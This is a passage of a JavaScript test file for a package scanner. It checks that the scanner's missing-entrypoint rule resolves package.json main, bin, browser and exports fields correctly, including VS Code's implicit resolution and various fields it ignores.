    ["a later array fallback", { exports: ["./index.js", "./missing.js"] }, ["index.js"]],
    [
      "a condition after default",
      { exports: { default: "./index.js", node: "./missing.js" } },
      ["index.js"],
    ],
  ])("does not flag %s that cannot be selected", (_name, manifest, paths) => {
    expect(findingsFor({ name: "pkg", version: "1.0.0", ...manifest }, paths)).toEqual([]);
  });

  test.each([
    ["exact path", { main: "dist/index.js" }, ["dist/index.js"]],
    ["implicit extension", { main: "dist/index" }, ["dist/index.js"]],
    ["directory index", { main: "lib" }, ["lib/index.js"]],
    ["directory package manifest", { main: "lib" }, ["lib/package.json"]],
    ["leading ./", { main: "./index.js" }, ["index.js"]],
    ["bin string form", { bin: "./cli.js" }, ["cli.js"]],
    [
      "nested exports conditions",
      { exports: { ".": { node: { require: "./a.cjs" } } } },
      ["a.cjs"],
    ],
    ["exports array fallbacks", { exports: ["./a.js"] }, ["a.js"]],
  ])("stays silent when a declared entrypoint resolves: %s", (_name, manifest, paths) => {
    expect(findingsFor({ name: "pkg", version: "1.0.0", ...manifest }, paths)).toEqual([]);
  });

  test.each(["cjs", "mjs"])("uses VS Code's implicit .%s entrypoint resolution", (extension) => {
    expect(
      findingsFor(
        { name: "pkg", version: "1.0.0", main: "out/extension" },
        [`out/extension.${extension}`],
        null,
        { entrypointResolution: "vscode" },
      ),
    ).toEqual([]);
  });

  test("reports a missing VS Code browser entrypoint against the browser field", () => {
    const findings = findingsFor(
      { name: "pkg", version: "1.0.0", browser: "out/browser" },
      [],
      null,
      { entrypointResolution: "vscode" },
    );

    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      line: 4,
      evidence: "browser out/browser is not in the package",
    });
  });

  test.each([
    [
      "a types condition",
      { exports: { ".": { types: "./dist/index.d.ts", default: "./dist/index.js" } } },
      ["dist/index.js"],
    ],
    [
      "a typings condition",
      { exports: { ".": { typings: "./dist/index.d.ts", default: "./dist/index.js" } } },
      ["dist/index.js"],
    ],
    ["a legacy exports folder mapping", { exports: { "./lib/": "./lib/" } }, ["lib/thing.js"]],
    ["a folder mapping consuming its array slot", { exports: ["./lib/", "./missing.js"] }, []],
  ])("does not flag %s", (_name, manifest, paths) => {
    expect(findingsFor({ name: "pkg", version: "1.0.0", ...manifest }, paths)).toEqual([]);
  });

  test.each([
    ["subpath patterns", { exports: { "./*": "./dist/*.js" } }],
    ["node: builtins", { exports: { node: "node:fs" } }],
    ["URL targets", { main: "https://example.invalid/index.js" }],
    ["package imports", { main: "#internal" }],
    ["bare specifiers", { exports: { default: "lodash" } }],
    ["blocked exports (null)", { exports: { "./private": null } }],
    ["paths escaping the package root", { main: "../outside.js" }],
  ])("does not treat %s as a packaged path", (_name, manifest) => {
    expect(findingsFor({ name: "pkg", version: "1.0.0", ...manifest }, [])).toEqual([]);
  });

  test("stays silent when the artifact has no manifest file to compare against", () => {
    // A metadata-only manifest (or a parse that produced no package.json) would
    // otherwise report every declared path as missing.
    const staged = [{ path: "index.js", size: 10, sha256: "a", flags: [], textSample: "" }];
    const manifest = { name: "pkg", version: "1.0.0", main: "missing.js" };

    expect(
      deterministicFindings(staged, [], manifest).filter(
        (finding) => finding.ruleId === "package-json.entrypoint-missing",
      ),
    ).toEqual([]);
  });
});
